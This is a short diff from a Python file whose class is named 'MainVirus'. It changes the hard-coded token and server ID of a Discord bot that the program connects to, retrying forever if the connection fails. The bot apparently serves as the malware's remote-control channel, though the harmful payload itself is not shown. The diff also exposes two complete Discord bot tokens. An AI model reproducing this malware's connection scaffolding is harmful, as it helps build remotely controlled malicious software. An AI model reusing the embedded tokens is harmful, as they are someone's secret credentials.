@@ -33,8 +33,8 @@ class MainVirus:  # Making a class to wrap code cause organisation
     def make_connection(self):  # makes a connection to the discord servers
         try:  # Tries to make a connection to the discord servers
             return lightbulb.BotApp( # Makes the Discord Bot
-                token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
-                default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
+                token="MTEzODc3OTAyOTc3NjkwODI5OA.GTvc30.Yl8lcQfyasu7EQaK1j0hD2wJMtw0sLiplxPLBE",  # Sets the token for the bot
+                default_enabled_guilds=1138779029776908298)  # i dunno man i tried
         except:  # What to when the connection fails
             time.sleep(1)  # Waits for one second
             self.make_connection()  # Tries to make a connection again
